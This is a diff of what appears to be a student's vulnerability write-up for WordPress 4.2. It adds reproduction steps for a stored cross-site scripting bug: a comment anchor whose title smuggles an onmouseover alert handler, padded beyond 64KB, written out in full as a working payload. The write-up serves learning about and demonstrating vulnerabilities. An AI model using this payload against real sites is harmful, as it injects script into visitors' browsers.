@@ -12,9 +12,10 @@ Time spent: 2 hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
   - [x] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
+  - [ ] Steps to recreate: I created a comment like this  - <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px 
+       AAAAAAAAAAAA...[64 kb]..AAA'></a> that was over 64Kb. I think posted the link in the comment section of a blog post and recieved a pop up window when i moved my mouse over the comment.
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+  - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
